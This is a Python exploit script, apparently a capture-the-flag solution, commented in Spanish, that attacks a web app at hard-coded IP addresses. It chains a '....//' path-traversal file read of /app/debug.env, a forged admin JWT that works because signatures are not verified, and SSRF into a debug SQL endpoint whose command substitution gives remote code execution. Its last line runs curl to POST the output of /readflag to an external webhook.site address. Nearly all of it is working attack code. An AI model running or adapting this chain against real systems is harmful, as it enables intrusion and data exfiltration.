import requests
import jwt
import string
import random
import datetime

url = "http://192.168.86.250:1337"
url = "http://94.237.61.58:56682"

def register(username, password):

    data = {
        'username': username,
        'password': password
    }

    r = requests.post(url + '/api/register', json=data)

    return "Account registered successfully!" in r.text

def login(username, password):
    data = {
        'username': username,
        'password': password
    }

    r = requests.post(url + '/api/login', json=data)

    if "User authenticated successfully!" in r.text:
        return r.headers['Set-Cookie']

    return False

def generate_random_string():
    length = 10

    return ''.join(random.choices(string.ascii_letters + string.digits, k=length)) 

def lfi(session_cookie, file):
    headers = {
        "Cookie": session_cookie
    }

    r = requests.get(url + '/download?resume=' + "....//....//....//....//....//....//....//....//....//" + file, headers=headers)

    return r.text

def generate_jwt_admin():
    payload = {
        "username": "admin",
        "iat": datetime.datetime.utcnow() + datetime.timedelta(minutes=30)
    }

    token = jwt.encode(payload, "test", algorithm='HS256')

    return token

def ssrf_rce(session_cookie, cmd, debug_pass):

    headers = {
        "Cookie": "session=" + session_cookie
    }

    data = {
        "verb": "POST",
        "url": "http://127.0.0.1:1337/debug/sql/exec", # Aqui esta el RCE
        "params": "{\"sql\" : \"$(%s)\", \"password\": \"%s\"}" % (cmd, debug_pass),
        "headers": f"Content-Type: application/json\nCookie: session={session_cookie}",
        "resp_ok": "<status>ok</status>",
        "resp_bad": "<status>error</status>"
    }

    r = requests.post(url + "/api/sms/test", json=data, headers=headers)

    print(r.text)

# 1. LFI
# Usuario normal
normal_username = generate_random_string()
normal_password = generate_random_string()
register(normal_username, normal_password)
session_cookie = login(normal_username, normal_password)
# Incluiremos el debug.env para posterior hacer el ssrf y rce
debug_pass = lfi(session_cookie, "/app/debug.env").split('=')[1].strip()

# 2. Bypass to admin desde falta de verificacion de firma de JWT
# Basta con crear un JWT firmado con cualquier valor pero que tenga el payload correspondiente

jwt_admin = generate_jwt_admin()

# 3. SSRF to RCE

ssrf_rce(jwt_admin,
          "curl https://webhook.site/bb672269-fdf6-4ac1-80ac-6c17e9d25223/ -X POST -d $(/readflag)",
            debug_pass)